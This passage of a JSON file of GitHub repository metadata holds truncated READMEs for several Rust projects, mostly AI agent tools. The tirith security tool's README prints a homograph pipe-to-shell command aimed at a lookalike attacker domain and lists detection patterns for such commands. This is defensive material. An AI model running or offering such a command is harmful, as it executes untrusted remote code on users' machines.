      "license": "Apache License 2.0",
      "topics": [
        "agent-framework",
        "ai-agents",
        "llm",
        "mcp",
        "open-source",
        "openclaw",
        "operating-system",
        "rust"
      ]
    },
    "content": {
      "readme": "<p align=\"center\">\n  <img src=\"public/assets/openfang-logo.png\" width=\"160\" alt=\"OpenFang Logo\" />\n</p>\n\n<h1 align=\"center\">OpenFang</h1>\n<h3 align=\"center\">The Agent Operating System</h3>\n\n<p align=\"center\">\n  Open-source Agent OS built in Rust. 137K LOC. 14 crates. 1,767+ tests. Zero clippy warnings.<br/>\n  <strong>One binary. Battle-tested. Agents that actually work for you.</strong>\n</p>\n\n<p align=\"center\">\n  <a href=\"https://openfang.sh/docs\">Documentation</a> &bull;\n  <a href=\"https://openfang.sh/docs/getting-started\">Quick Start</a> &bull;\n  <a href=\"https://x.com/openfangg\">Twitter / X</a>\n</p>\n\n<p align=\"center\">\n  <img src=\"https://img.shields.io/badge/language-Rust-orange?style=flat-square\" alt=\"Rust\" />\n  <img src=\"https://img.shields.io/badge/license-MIT-blue?style=flat-square\" alt=\"MIT\" />\n  <img src=\"https://img.shields.io/badge/version-0.1.0-green?style=flat-square\" alt=\"v0.1.0\" />\n  <img src=\"https://img.shields.io/badge/tests-1,767%2B%20passing-brightgreen?style=flat-square\" alt=\"Tests\" />\n  <img src=\"https://img.shields.io/badge/clippy-0%20warnings-brightgreen?style=flat-square\" alt=\"Clippy\" />\n</p>\n\n---\n\n> **v0.1.0 ‚Äî First Release (February 2026)**\n>\n> OpenFang is feature-complete but this is the first public release. You may encounter instability, rough edges, or breaking changes between minor versions. We ship fast and fix fast. Pin to a specific commit for production use until v1.0. [Report issues here.](https://github.com/RightNow-AI/openfang/issues)\n\n---\n\n## What is OpenFang?\n\nOpenFang is an **open-source Agent Operating System** ‚Äî not a chatbot framework, not a Python wrapper around an LLM, not a \"multi-agent orchestrator.\" It is a full operating system for autonomous agents, built from scratch in Rust.\n\nTraditional agent frameworks wait for you to type something. OpenFang runs **autonomous agents that work for you** ‚Äî on schedules, 24/7, building knowledge graphs, monitoring targets, generating leads, managing your social media, and reporting results to your dashboard.\n\nThe entire system compiles to a **single ~32MB binary**. One install, one command, your agents are live.\n\n```bash\ncurl -fsSL https://openfang.sh/install | sh\nopenfang init\nopenfang start\n# Dashboard live at http://localhost:4200\n```\n\n<details>\n<summary><strong>Windows</strong></summary>\n\n```powershell\nirm https://openfang.sh/install.ps1 | iex\nopenfang init\nopenfang start\n```\n\n</details>\n\n---\n\n## Hands: Agents That Actually Do Things\n\n<p align=\"center\"><em>\"Traditional agents wait for you to type. Hands work <strong>for</strong> you.\"</em></p>\n\n**Hands** are OpenFang's core innovation ‚Äî pre-built autonomous capability packages that run independently, on schedules, without you having to prompt them. This is not a chatbot. This is an agent that wakes up at 6 AM, researches your competitors, builds a knowledge graph, scores the findings, and delivers a report to your Telegram before you've had coffee.\n\nEach Hand bundles:\n- **HAND.toml** ‚Äî Manifest declaring tools, settings, requirements, and dashboard metrics\n- **System Prompt** ‚Äî Multi-phase operational playbook (not a one-liner ‚Äî these are 500+ word expert procedures)\n- **SKILL.md** ‚Äî Domain expertise reference injected into context at runtime\n- **Guardrails** ‚Äî Approval gates for sensitive actions (e.g. Browser Hand requires approval before any purchase)\n\nAll compiled into the binary. No downloading, no pip install, no Docker pull.\n\n### The 7 Bundled Hands\n\n| Hand | What It Actually Does |\n|------|----------------------|\n| **Clip** | Takes a YouTube URL, downloads it, identifies the best moments, cuts them into vertical shorts with captions and thumbnails, optionally adds AI voice-over, and publishes to Telegram and WhatsApp. 8-phase pipeline. FFmpeg + yt-dlp + 5 STT backends. |\n| **Lead** | Runs daily. Discovers prospects matching your ICP, enriches them with web research, scores 0-100, deduplicates against your existing database, and delivers qualified leads in CSV/JSON/Markdown. Builds ICP profiles over time. |\n| **Collector** | OSINT-grade intelligence. You give it a target (company, person, topic). It monitors continuously ‚Äî change detection, sentiment tracking, knowledge graph construction, and critical alerts when something important shifts. |\n| **Predictor** | Superforecasting engine. Collects signals from multiple sources, builds calibrated reasoning chains, makes predictions with confidence intervals, and tracks its own accuracy using Brier scores. Has a contrarian mode that deliberately argues against consensus. |\n| **Researcher** | Deep autonomous researcher. Cross-references multiple sources, evaluates credibility using CRAAP criteria (Currency, Relevance, Authority, Accuracy, Purpose), generates cited reports with APA formatting, supports multiple languages. |\n| **Twitter** | Autonomous Twitter/X account manager. Creates content in 7 rotating formats, schedules posts for optimal engagement, responds to mentions, tracks performance metrics. Has an appro",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-27T03:25:53.073279"
  },
  {
    "basic_info": {
      "name": "Kaku",
      "full_name": "tw93/Kaku",
      "owner": "tw93",
      "description": "üéÉ A fast, out-of-the-box terminal built for AI coding.",
      "url": "https://github.com/tw93/Kaku",
      "clone_url": "https://github.com/tw93/Kaku.git",
      "ssh_url": "git@github.com:tw93/Kaku.git",
      "homepage": "https://x.com/HiTw93/status/2024476563870523825",
      "created_at": "2026-02-07T13:00:49Z",
      "updated_at": "2026-02-27T03:21:55Z",
      "pushed_at": "2026-02-27T03:21:52Z"
    },
    "stats": {
      "stars": 2068,
      "forks": 91,
      "watchers": 2068,
      "open_issues": 1,
      "size": 19910
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 15259360,
        "Shell": 109069,
        "Lua": 68810,
        "GLSL": 5446,
        "WGSL": 3641,
        "Makefile": 1429
      },
      "license": "Other",
      "topics": [
        "ai-coding",
        "macos",
        "rust",
        "serial",
        "terminal",
        "terminal-app",
        "terminal-emulator",
        "vibe-coding"
      ]
    },
    "content": {
      "readme": "<div align=\"center\">\n  <h1>Kaku</h1>\n  <p><em>A fast, out-of-the-box terminal built for AI coding.</em></p>\n</div>\n\n<p align=\"center\">\n  <a href=\"https://github.com/tw93/Kaku/stargazers\"><img src=\"https://img.shields.io/github/stars/tw93/Kaku?style=flat-square\" alt=\"Stars\"></a>\n  <a href=\"https://github.com/tw93/Kaku/releases\"><img src=\"https://img.shields.io/github/v/tag/tw93/Kaku?label=version&style=flat-square\" alt=\"Version\"></a>\n  <a href=\"LICENSE.md\"><img src=\"https://img.shields.io/badge/license-MIT-blue.svg?style=flat-square\" alt=\"License\"></a>\n  <a href=\"https://github.com/tw93/Kaku/commits\"><img src=\"https://img.shields.io/github/commit-activity/m/tw93/Kaku?style=flat-square\" alt=\"Commits\"></a>\n  <a href=\"https://twitter.com/HiTw93\"><img src=\"https://img.shields.io/badge/follow-Tw93-red?style=flat-square&logo=Twitter\" alt=\"Twitter\"></a>\n</p>\n\n<p align=\"center\">\n  <img src=\"assets/kaku.jpeg\" alt=\"Kaku Screenshot\" width=\"1000\" />\n  <br/>\n  Kaku is a deeply customized fork of <a href=\"https://github.com/wez/wezterm\">WezTerm</a>, designed for an out-of-the-box experience.\n</p>\n\n## Features\n\n- **Zero Config**: Defaults with JetBrains Mono, opencode theme, macOS font rendering, and low-res font sizing.\n- **Curated Shell Suite**: Built-in zsh plugins with optional CLI tools for prompt, diff, and navigation workflows.\n- **Fast & Lightweight**: 40% smaller binary, instant startup, lazy loading, stripped-down GPU-accelerated core.\n- **WezTerm-Compatible Config**: Use WezTerm's Lua config directly with full API compatibility and no migration.\n\n## Quick Start\n\n1. [Download Kaku DMG](https://github.com/tw93/Kaku/releases/latest) & Drag to Applications\n2. Or install with Homebrew: `brew install tw93/tap/kakuku`\n3. Open Kaku. The app is notarized by Apple, so it opens without security warnings\n4. On first launch, Kaku will automatically set up your shell environment\n\n## Usage Guide\n\nKaku comes with intuitive macOS-native shortcuts:\n\n| Action | Shortcut |\n| :--- | :--- |\n| Toggle Global Window | `Cmd + Opt + Ctrl + K` |\n| New Tab | `Cmd + T` |\n| New Window | `Cmd + N` |\n| Close Tab/Pane | `Cmd + W` |\n| Navigate Tabs | `Cmd + Shift + [`, `Cmd + Shift + ]` or `Cmd + 1-9` |\n| Navigate Panes | `Cmd + Opt + Arrows` |\n| Split Pane Vertical | `Cmd + D` |\n| Split Pane Horizontal | `Cmd + Shift + D` |\n| Toggle Split Direction | `Cmd + Shift + S` |\n| Zoom/Unzoom Pane | `Cmd + Shift + Enter` |\n| Resize Pane | `Cmd + Ctrl + Arrows` |\n| Clear Screen | `Cmd + K` |\n| Doctor Panel | `Ctrl + Shift + L` |\n| Kaku AI Settings | `Cmd + Shift + A` |\n| Kaku Assistant Apply Suggestion | `Cmd + Shift + E` |\n| Open Lazygit | `Cmd + Shift + G` |\n| Yazi File Manager | `Cmd + Shift + Y` or `y` |\n| Font Size | `Cmd + +`, `Cmd + -`, `Cmd + 0` |\n| Smart Jump | `z <dir>` |\n| Smart Select | `z -l <dir>` |\n| Recent Dirs | `z -t` |\n\n### Intuitive Interactions\n\n- **Visual Bell**: A blinking dot appears on inactive tabs when background tasks finish.\n- **Global Hotkey**: Press `Cmd + Opt + Ctrl + K` anytime to float Kaku over your current workspace.\n- **Copy on Select**: Highlighting any text automatically copies it to your clipboard with a confirmation toast.\n- **Zoom Window**: Double-click the title bar or tab bar empty space to safely zoom or unzoom the window.\n- **Finder Integration**: Right-click folders in macOS Finder and deploy Kaku via Services, or drop multiple files directly onto the Kaku Dock icon.\n- **History Peek**: Scroll up while inside full-screen apps like `less` or `vim` to lift the screen and peek at your primary shell history without exiting.\n\n## Configuration\n\nKaku comes with a carefully curated shell stack for immediate productivity, so you can focus on AI coding without opening vscode:\n\nBuilt-in zsh plugins bundled by default:\n\n- **z**: A smarter cd command that learns your most used directories for instant navigation.\n- **zsh-completions**: Extended command and subcommand completion definitions.\n- **Syntax Highlighting**: Real-time command validation and coloring.\n- **Autosuggestions**: Intelligent, history-based completions similar to Fish shell.\n\nOptional CLI tools installed via Homebrew during `kaku init`:\n\n- **Starship**: A fast, customizable prompt showing git status, package versions, and execution time.\n- **Delta**: A syntax-highlighting pager for git, diff, and grep output.\n- **Lazygit**: A terminal UI for fast, visual Git workflows without leaving the shell.\n- **Yazi**: A terminal file manager. Use `y` to launch it and sync the shell directory on exit.\n\nKaku uses `~/.config/kaku/kaku.lua` for configuration, fully compatible with WezTerm's Lua API, with built-in defaults at `Kaku.app/Contents/Resources/kaku.lua` as fallback.\n\nRun `kaku` in your terminal to see all available commands such as `kaku ai`, `kaku config`, `kaku doctor`, `kaku update`, and `kaku reset`.\n\n## Kaku AI\n\nKaku includes a built-in assistant for command-line error recovery and a unified settings UI for external AI coding tools.\n\n- **Kaku Assistant**: ",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-27T03:25:54.211848"
  },
  {
    "basic_info": {
      "name": "tirith",
      "full_name": "sheeki03/tirith",
      "owner": "sheeki03",
      "description": "Your browser catches homograph attacks. Your terminal doesn't. Tirith guards the gate and intercepts suspicious URLs, ANSI injection, and pipe-to-shell attacks before they execute.",
      "url": "https://github.com/sheeki03/tirith",
      "clone_url": "https://github.com/sheeki03/tirith.git",
      "ssh_url": "git@github.com:sheeki03/tirith.git",
      "homepage": "https://tirith.sh",
      "created_at": "2026-02-02T04:33:47Z",
      "updated_at": "2026-02-27T00:56:11Z",
      "pushed_at": "2026-02-26T15:19:16Z"
    },
    "stats": {
      "stars": 1909,
      "forks": 67,
      "watchers": 1909,
      "open_issues": 4,
      "size": 5831
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 1189772,
        "Shell": 95087,
        "PowerShell": 21426,
        "Python": 15416,
        "Nushell": 3666,
        "TypeScript": 3192,
        "Nix": 2426,
        "Ruby": 1739,
        "JavaScript": 1162,
        "Dockerfile": 614
      },
      "license": "GNU Affero General Public License v3.0",
      "topics": [
        "cli",
        "devtools",
        "homograph-attack",
        "rust",
        "security",
        "shell",
        "supply-chain-security",
        "terminal",
        "unicode",
        "url-security"
      ]
    },
    "content": {
      "readme": "# tirith\n\n**Your browser would catch this. Your terminal won't.**\n\n<p align=\"center\">\n  <img src=\"assets/cover.png\" alt=\"tirith ‚Äî terminal security\" width=\"100%\" />\n</p>\n\n[![CI](https://github.com/sheeki03/tirith/actions/workflows/ci.yml/badge.svg)](https://github.com/sheeki03/tirith/actions/workflows/ci.yml)\n[![GitHub Stars](https://img.shields.io/github/stars/sheeki03/tirith?style=flat&logo=github)](https://github.com/sheeki03/tirith/stargazers)\n[![License: AGPL-3.0](https://img.shields.io/badge/license-AGPL--3.0-blue)](LICENSE-AGPL)\n\n[Website](https://tirith.sh) | [Docs](https://tirith.sh/docs) | [Changelog](https://github.com/sheeki03/tirith/releases)\n\n---\n\nCan you spot the difference?\n\n```\n  curl -sSL https://install.example-cli.dev | bash     # safe\n  curl -sSL https://—ñnstall.example-cl—ñ.dev | bash     # compromised\n```\n\nYou can't. Neither can your terminal. Both `—ñ` characters are Cyrillic (U+0456), not Latin `i`. The second URL resolves to an attacker's server. The script executes before you notice.\n\nBrowsers solved this years ago. Terminals still render Unicode, ANSI escapes, and invisible characters without question.\n\n**Tirith stands at the gate.**\n\n```bash\nbrew install sheeki03/tap/tirith\n```\n\nThen activate in your shell profile:\n\n```bash\n# zsh\neval \"$(tirith init --shell zsh)\"\n\n# bash\neval \"$(tirith init --shell bash)\"\n\n# fish\ntirith init --shell fish | source\n```\n\nThat's it. Every command you run is now guarded. Zero friction on clean input. Sub-millisecond overhead. You forget it's there until it saves you.\n\nAlso available via [npm](#cross-platform), [cargo](#cross-platform), [mise](#cross-platform), [apt/dnf](#linux-packages), and [more](#install).\n\n---\n\n## See it work\n\n**Homograph attack ‚Äî blocked before execution:**\n\n```\n$ curl -sSL https://—ñnstall.example-cl—ñ.dev | bash\n\ntirith: BLOCKED\n  [CRITICAL] non_ascii_hostname ‚Äî Cyrillic —ñ (U+0456) in hostname\n    This is a homograph attack. The URL visually mimics a legitimate\n    domain but resolves to a completely different server.\n  Bypass: prefix your command with TIRITH=0 (applies to that command only)\n```\n\nThe command never executes.\n\n**Pipe-to-shell with clean URL ‚Äî warned, not blocked:**\n\n```\n$ curl -fsSL https://get.docker.com | sh\n\ntirith: WARNING\n  [MEDIUM] pipe_to_interpreter ‚Äî Download piped to interpreter\n    Consider downloading first and reviewing.\n```\n\nWarning prints to stderr. Command still runs.\n\n**Normal commands ‚Äî invisible:**\n\n```\n$ git status\n$ ls -la\n$ docker compose up -d\n```\n\nNothing. Zero output. You forget tirith is running.\n\n---\n\n## What it catches\n\n**66 detection rules across 11 categories.**\n\n| Category | What it stops |\n|----------|--------------|\n| **Homograph attacks** | Cyrillic/Greek lookalikes in hostnames, punycode domains, mixed-script labels, lookalike TLDs, confusable domains |\n| **Terminal injection** | ANSI escape sequences, bidi overrides, zero-width characters, unicode tags, invisible math operators, variation selectors |\n| **Pipe-to-shell** | `curl \\| bash`, `wget \\| sh`, `httpie \\| sh`, `xh \\| sh`, `python <(curl ...)`, `eval $(wget ...)` ‚Äî every source-to-sink pattern |\n| **Command safety** | Dotfile overwrites, archive extraction to sensitive paths, cloud metadata endpoint access, private network access |\n| **Insecure transport** | Plain HTTP piped to shell, `curl -k`, disabled TLS verification, shortened URLs hiding destinations |\n| **Environment** | Proxy hijacking, sensitive env exports, code injection via env, interpreter hijack, shell injection env |\n| **Config file security** | Config injection, suspicious indicators, non-ASCII/invisible unicode in configs, MCP server security (insecure/untrusted/duplicate/permissive) |\n| **Ecosystem threats** | Git clone typosquats, untrusted Docker registries, pip/npm URL installs, web3 RPC endpoints, vet-not-configured |\n| **Path analysis** | Non-ASCII paths, homoglyphs in paths, double-encoding |\n| **Rendered content** | Hidden CSS/color content, hidden HTML attributes, markdown/HTML comments with instructions |\n| **Cloaking detection** | Server-side cloaking (bot vs browser), clipboard hidden content, PDF hidden text |\n\n---\n\n## AI agent security\n\nTirith protects AI coding agents at every layer ‚Äî from the configs they read to the commands they execute.\n\n### MCP server (7 tools)\n\nRun `tirith mcp-server` or use `tirith setup <tool> --with-mcp` to register tirith as an MCP server. AI agents can call these tools before taking action:\n\n| Tool | What it does |\n|------|-------------|\n| `tirith_check_command` | Analyze shell commands for pipe-to-shell, homograph URLs, env injection |\n| `tirith_check_url` | Score URLs for homograph attacks, punycode tricks, shortened URLs, raw IPs |\n| `tirith_check_paste` | Check pasted content for ANSI escapes, bidi controls, zero-width chars |\n| `tirith_scan_file` | Scan a file for hidden content, invisible Unicode, config poisoning |\n| `tirith_scan_directory` | Recursive scan with AI config file prioritization |\n| `tirith_verif",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-27T03:25:55.379227"
  },
  {
    "basic_info": {
      "name": "moltis",
      "full_name": "moltis-org/moltis",
      "owner": "moltis-org",
      "description": "A Rust-native claw you can trust. One binary ‚Äî sandboxed, secure, auditable. Voice, memory, MCP tools, and multi-channel access built-in.",
      "url": "https://github.com/moltis-org/moltis",
      "clone_url": "https://github.com/moltis-org/moltis.git",
      "ssh_url": "git@github.com:moltis-org/moltis.git",
      "homepage": "https://moltis.org",
      "created_at": "2026-01-29T19:36:31Z",
      "updated_at": "2026-02-27T03:21:27Z",
      "pushed_at": "2026-02-27T03:21:18Z"
    },
    "stats": {
      "stars": 1566,
      "forks": 155,
      "watchers": 1566,
      "open_issues": 81,
      "size": 21453
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 6241553,
        "JavaScript": 1376232,
        "CSS": 171718,
        "Swift": 163107,
        "HTML": 114351,
        "Shell": 62411,
        "Just": 8268,
        "Dockerfile": 3497,
        "Python": 1835,
        "Ruby": 1456,
        "Nix": 1075,
        "C": 102
      },
      "license": "MIT License",
      "topics": [
        "ai-agent",
        "ai-assistant",
        "clawdbot",
        "llm",
        "mcp",
        "openclaw",
        "rust",
        "sandbox",
        "self-hosted",
        "single-binary",
        "telegram-bot",
        "voice-assistant"
      ]
    },
    "content": {
      "readme": "<div align=\"center\">\n\n<a href=\"https://moltis.org\"><img src=\"https://raw.githubusercontent.com/moltis-org/moltis-website/main/favicon.svg\" alt=\"Moltis\" width=\"64\"></a>\n\n# Moltis ‚Äî A Rust-native claw you can trust\n\nOne binary ‚Äî sandboxed, secure, yours.\n\n[![CI](https://github.com/moltis-org/moltis/actions/workflows/ci.yml/badge.svg)](https://github.com/moltis-org/moltis/actions/workflows/ci.yml)\n[![codecov](https://codecov.io/gh/moltis-org/moltis/graph/badge.svg)](https://codecov.io/gh/moltis-org/moltis)\n[![CodSpeed](https://img.shields.io/endpoint?url=https://codspeed.io/badge.json&style=flat&label=CodSpeed)](https://codspeed.io/moltis-org/moltis)\n[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)\n[![Rust](https://img.shields.io/badge/Rust-1.91%2B-orange.svg)](https://www.rust-lang.org)\n[![Discord](https://img.shields.io/discord/1469505370169933837?color=5865F2&label=Discord&logo=discord&logoColor=white)](https://discord.gg/XnmrepsXp5)\n\n[Installation](#installation) ‚Ä¢ [Comparison](#comparison) ‚Ä¢ [Architecture](#architecture--crate-map) ‚Ä¢ [Security](#security) ‚Ä¢ [Features](#features) ‚Ä¢ [How It Works](#how-it-works) ‚Ä¢ [Contributing](CONTRIBUTING.md)\n\n</div>\n\n---\n\nMoltis recently hit [the front page of Hacker News](https://news.ycombinator.com/item?id=46993587). Please [open an issue](https://github.com/moltis-org/moltis/issues) for any friction at all. I'm focused on making Moltis excellent.\n\n**Secure by design** ‚Äî Your keys never leave your machine. Every command runs in a sandboxed container, never on your host.\n\n**Your hardware** ‚Äî Runs on a Mac Mini, a Raspberry Pi, or any server you own. One Rust binary, no Node.js, no npm, no runtime.\n\n**Full-featured** ‚Äî Voice, memory, scheduling, Telegram, browser automation, MCP servers ‚Äî all built-in. No plugin marketplace to get supply-chain attacked through.\n\n**Auditable** ‚Äî The agent loop + provider model fits in ~5K lines. The core (excluding the optional web UI) is ~121K lines across modular crates you can audit independently, with 2,300+ tests and zero `unsafe` code\\*.\n\n## Installation\n\n```bash\n# One-liner install script (macOS / Linux)\ncurl -fsSL https://www.moltis.org/install.sh | sh\n\n# macOS / Linux via Homebrew\nbrew install moltis-org/tap/moltis\n\n# Docker (multi-arch: amd64/arm64)\ndocker pull ghcr.io/moltis-org/moltis:latest\n\n# Or build from source\ncargo install moltis --git https://github.com/moltis-org/moltis\n```\n\n## Comparison\n\n| | OpenClaw | PicoClaw | NanoClaw | ZeroClaw | **Moltis** |\n|---|---|---|---|---|---|\n| Language | TypeScript | Go | TypeScript | Rust | **Rust** |\n| Agent loop | ~430K LoC | Small | ~500 LoC | ~3.4K LoC | **~5K LoC** (`runner.rs` + `model.rs`) |\n| Full codebase | ‚Äî | ‚Äî | ‚Äî | 1,000+ tests | **~124K LoC** (2,300+ tests) |\n| Runtime | Node.js + npm | Single binary | Node.js | Single binary (3.4 MB) | **Single binary (44 MB)** |\n| Sandbox | App-level | ‚Äî | Docker | Docker | **Docker + Apple Container** |\n| Memory safety | GC | GC | GC | Ownership | **Ownership, zero `unsafe`\\*** |\n| Auth | Basic | API keys | None | Token + OAuth | **Password + Passkey + API keys + Vault** |\n| Voice I/O | Plugin | ‚Äî | ‚Äî | ‚Äî | **Built-in (15+ providers)** |\n| MCP | Yes | ‚Äî | ‚Äî | ‚Äî | **Yes (stdio + HTTP/SSE)** |\n| Hooks | Yes (limited) | ‚Äî | ‚Äî | ‚Äî | **15 event types** |\n| Skills | Yes (store) | Yes | Yes | Yes | **Yes (+ OpenClaw Store)** |\n| Memory/RAG | Plugin | ‚Äî | Per-group | SQLite + FTS | **SQLite + FTS + vector** |\n\n\\* `unsafe` is denied workspace-wide. The only exceptions are opt-in FFI wrappers behind the `local-embeddings` feature flag, not part of the core.\n\n> [Full comparison with benchmarks ‚Üí](https://docs.moltis.org/comparison.html)\n\n## Architecture ‚Äî Crate Map\n\n**Core** (always compiled):\n\n| Crate | LoC | Role |\n|-------|-----|------|\n| `moltis` (cli) | 2.4K | Entry point, CLI commands |\n| `moltis-agents` | 20.1K | LLM providers, agent loop, streaming |\n| `moltis-gateway` | 29.2K | HTTP/WS server, RPC, auth |\n| `moltis-chat` | 10.2K | Chat engine, agent orchestration |\n| `moltis-tools` | 13.4K | Tool execution, sandbox |\n| `moltis-config` | 5.1K | Configuration, validation |\n| `moltis-sessions` | 2.7K | Session persistence |\n| `moltis-plugins` | 1.4K | Hook dispatch, plugin formats |\n| `moltis-common` | 0.8K | Shared utilities |\n\n**Optional** (feature-gated or additive):\n\n| Category | Crates | Combined LoC |\n|----------|--------|-------------|\n| Web UI | `moltis-web` | 4.3K |\n| Voice | `moltis-voice` | 4.7K |\n| Memory | `moltis-memory`, `moltis-qmd` | 5.8K |\n| Channels | `moltis-telegram`, `moltis-msteams`, `moltis-channels` | 6.4K |\n| Browser | `moltis-browser` | 4.8K |\n| Scheduling | `moltis-cron` | 3.8K |\n| Extensibility | `moltis-mcp`, `moltis-skills` | 7.4K |\n| Auth/OAuth | `moltis-oauth`, `moltis-onboarding`, `moltis-vault` | 2.8K |\n| Metrics | `moltis-metrics` | 1.7K |\n| Other | `moltis-projects`, `moltis-routing`, `moltis-protocol`, `moltis-media`, `moltis-canvas`, `moltis-auto-reply` | 2.4K |\n\nUse `--",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-27T03:25:56.524351"
  },
  {
    "basic_info": {
      "name": "spacebot",
      "full_name": "spacedriveapp/spacebot",
      "owner": "spacedriveapp",
      "description": "An AI agent for teams, communities, and multi-user environments.",
      "url": "https://github.com/spacedriveapp/spacebot",
      "clone_url": "https://github.com/spacedriveapp/spacebot.git",
      "ssh_url": "git@github.com:spacedriveapp/spacebot.git",
      "homepage": "https://spacebot.sh",
      "created_at": "2026-02-11T23:53:16Z",
      "updated_at": "2026-02-27T03:09:25Z",
      "pushed_at": "2026-02-27T03:10:48Z"
    },
    "stats": {
      "stars": 1396,
      "forks": 194,
      "watchers": 1396,
      "open_issues": 58,
      "size": 4636
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 2117172,
        "TypeScript": 633012,
        "Jinja": 54032,
        "Nix": 17368,
        "Shell": 16982,
        "SCSS": 9598,
        "Dockerfile": 2843,
        "Just": 550,
        "HTML": 400,
        "JavaScript": 75
      },
      "license": "Other",
      "topics": [
        "agent",
        "ai"
      ]
    },
    "content": {
      "readme": "<p align=\"center\">\n  <img src=\".github/Ball.png\" alt=\"Spacebot\" width=\"120\" height=\"120\" />\n</p>\n\n<h1 align=\"center\">Spacebot</h1>\n\n<p align=\"center\">\n  <strong>An AI agent for teams, communities, and multi-user environments.</strong><br/>\n  Thinks, executes, and responds ‚Äî concurrently, not sequentially.<br/>\n  Never blocks. Never forgets.\n</p>\n\n<p align=\"center\">\n  <a href=\"https://fsl.software/\">\n    <img src=\"https://img.shields.io/static/v1?label=License&message=FSL-1.1-ALv2&color=000\" />\n  </a>\n  <a href=\"https://github.com/spacedriveapp/spacebot\">\n    <img src=\"https://img.shields.io/static/v1?label=Core&message=Rust&color=DEA584\" />\n  </a>\n  <a href=\"https://discord.gg/gTaF2Z44f5\">\n    <img src=\"https://img.shields.io/discord/949090953497567312?label=Discord&color=5865F2\" />\n  </a>\n</p>\n\n<p align=\"center\">\n  <a href=\"https://spacebot.sh\"><strong>spacebot.sh</strong></a> ‚Ä¢\n  <a href=\"#how-it-works\">How It Works</a> ‚Ä¢\n  <a href=\"#architecture\">Architecture</a> ‚Ä¢\n  <a href=\"#quick-start\">Quick Start</a> ‚Ä¢\n  <a href=\"#tech-stack\">Tech Stack</a> ‚Ä¢\n  <a href=\"https://docs.spacebot.sh\">Docs</a>\n</p>\n\n> **One-click deploy with [spacebot.sh](https://spacebot.sh)** ‚Äî connect your Discord, Slack, Telegram, or Twitch, configure your agent, and go. No self-hosting required.\n\n<p align=\"center\">\n  <img src=\".github/spacebot-ui.jpg\" alt=\"Spacebot UI\" />\n</p>\n\n---\n\n## The Problem\n\nMost AI agent frameworks run everything in a single session. One LLM thread handles conversation, thinking, tool execution, memory retrieval, and context compaction ‚Äî all in one loop. When it's doing work, it can't talk to you. When it's compacting, it goes dark. When it retrieves memories, raw results pollute the context with noise.\n\n[OpenClaw](https://github.com/anomalyco/openclaw) _does_ have subagents, but handles them poorly and there's no enforcement to their use. The session is the bottleneck for everything.\n\nSpacebot splits the monolith into specialized processes that only do one thing, and delegate everything else.\n\n---\n\n## Built for Teams and Communities\n\nMost AI agents are built for one person in one conversation. Spacebot is built for many people working together ‚Äî a Discord community with hundreds of active members, a Slack workspace with teams running parallel workstreams, a Telegram group coordinating across time zones.\n\nThis is why the architecture exists. A single-threaded agent breaks the moment two people talk at once. Spacebot's delegation model means it can think about User A's question, execute a task for User B, and respond to User C's small talk ‚Äî all at the same time, without any of them waiting on each other.\n\n**For communities** ‚Äî drop Spacebot into a Discord server. It handles concurrent conversations across channels and threads, remembers context about every member, and does real work (code, research, file operations) without going dark. Fifty people can interact with it simultaneously.\n\n**For fast-moving channels** ‚Äî when messages are flying in, Spacebot doesn't try to respond to every single one. A message coalescing system detects rapid-fire bursts, batches them into a single turn, and lets the LLM read the room ‚Äî it picks the most interesting thing to engage with, or stays quiet if there's nothing to add. Configurable debounce timing, automatic DM bypass, and the LLM always knows which messages arrived together.\n\n**For teams** ‚Äî connect it to Slack. Each channel gets a dedicated conversation with shared memory. Spacebot can run long coding sessions for one engineer while answering quick questions from another. Workers handle the heavy lifting in the background while the channel stays responsive.\n\n**For multi-agent setups** ‚Äî run multiple agents on one instance. A community bot with a friendly personality on Discord, a no-nonsense dev assistant on Slack, and a research agent handling background tasks. Each with its own identity, memory, and security permissions. One binary, one deploy.\n\n### Deploy Your Way\n\n| Method                                 | What You Get                                                                                |\n| -------------------------------------- | ------------------------------------------------------------------------------------------- |\n| **[spacebot.sh](https://spacebot.sh)** | One-click hosted deploy. Connect your platforms, configure your agent, done.                |\n| **Self-hosted**                        | Single Rust binary. No Docker, no server dependencies, no microservices. Clone, build, run. |\n| **Docker**                             | Container image with everything included. Mount a volume for persistent data.               |\n\n---\n\n## Capabilities\n\n### Task Execution\n\nWorkers come loaded with tools for real work:\n\n- **Shell** ‚Äî run arbitrary commands with configurable timeouts\n- **File** ‚Äî read, write, and list files with auto-created directories\n- **Exec** ‚Äî run specific programs with arguments and environment variables\n- **[OpenCode](https://opencode.ai",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-27T03:25:57.673140"
  },
  {
    "basic_info": {
      "name": "polymarket-cli",
      "full_name": "Polymarket/polymarket-cli",
      "owner": "Polymarket",
      "description": null,
      "url": "https://github.com/Polymarket/polymarket-cli",
      "clone_url": "https://github.com/Polymarket/polymarket-cli.git",
      "ssh_url": "git@github.com:Polymarket/polymarket-cli.git",
      "homepage": null,
      "created_at": "2026-02-24T13:41:46Z",
      "updated_at": "2026-02-27T03:14:18Z",
      "pushed_at": "2026-02-25T15:02:09Z"
    },
    "stats": {
      "stars": 1212,
      "forks": 101,
      "watchers": 1212,
      "open_issues": 18,
      "size": 112
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 268916,
        "Shell": 4848,
        "Ruby": 1357
      },
      "license": null,
      "topics": []
    },
    "content": {
